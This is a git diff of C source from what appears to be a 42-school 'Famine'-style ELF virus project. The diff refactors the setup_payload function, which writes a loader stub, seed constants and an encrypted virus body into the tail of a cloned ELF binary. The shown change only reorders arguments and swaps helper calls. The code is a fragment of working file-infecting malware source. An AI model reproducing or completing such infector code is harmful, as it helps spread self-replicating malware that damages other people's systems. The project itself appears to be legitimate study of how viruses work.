@@ -6,18 +6,15 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/19 22:28:53 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/27 00:13:16 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include <stdint.h>
-#include <time.h>
-#include <stdbool.h>
-#include <linux/elf.h>
-#include "utils.h"
-#include "infect.h"
+#include "accessors.h"
 #include "errors.h"
-#include "famine.h"
+#include "loader.h"
+#include "utils.h"
+#include "virus.h"
 
 /*
 **  Elf64_packer memory overview
@@ -60,9 +57,9 @@ static void	init_constants(struct virus_header *constants, \
 			const struct entry *clone_entry, uint64_t son_seed[2])
 {
 	const size_t		end_of_last_section = clone_entry->end_of_last_section;
-	const Elf64_Off		p_offset  = (clone_entry->safe_phdr->p_offset);
-	const Elf64_Xword	p_memsz   = (clone_entry->safe_phdr->p_memsz);
-	const Elf64_Off		sh_offset = (clone_entry->safe_shdr->sh_offset);
+	const Elf64_Off		p_offset  = clone_entry->safe_phdr->p_offset;
+	const Elf64_Xword	p_memsz   = clone_entry->safe_phdr->p_memsz;
+	const Elf64_Off		sh_offset = clone_entry->safe_shdr->sh_offset;
 	const size_t		rel_text  = end_of_last_section - sh_offset;
 
 	constants->seed[0]                  = son_seed[0];
@@ -74,7 +71,7 @@ static void	init_constants(struct virus_header *constants, \
 	constants->virus_size               = (uint64_t)_start - (uint64_t)virus;
 }
 
-bool		setup_payload(const struct entry *clone_entry, struct safe_ptr ref, uint64_t son_seed[2])
+bool		setup_payload(struct safe_ptr ref, const struct entry *clone_entry, uint64_t son_seed[2])
 {
 	struct virus_header	constants;
 
@@ -85,15 +82,15 @@ bool		setup_payload(const struct entry *clone_entry, struct safe_ptr ref, uint64
 	const size_t	payload_off  = clone_entry->end_of_last_section;
 	const size_t	virus_off    = payload_off + constants.relative_virus_address;
 
-	void	*payload_location    = safe(payload_off, payload_size);
-	void	*constants_location  = safe(payload_off + CALL_INSTR_SIZE, sizeof(constants));
-	void	*virus_location      = safe(virus_off, virus_size);
+	void	*payload_location    = safe(ref, payload_off, payload_size);
+	void	*constants_location  = safe(ref, payload_off + CALL_INSTR_SIZE, sizeof(constants));
+	void	*virus_location      = safe(ref, virus_off, virus_size);
 
 	if (!payload_location || !constants_location || !virus_location)
 		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
 
-	ft_memcpy(payload_location, (void *)loader_entry, payload_size);
-	ft_memcpy(constants_location, &constants, sizeof(constants));
+	memcpy(payload_location, (void *)loader_entry, payload_size);
+	memcpy(constants_location, &constants, sizeof(constants));
 	cypher(virus_location, virus_size);
 
 	return true;
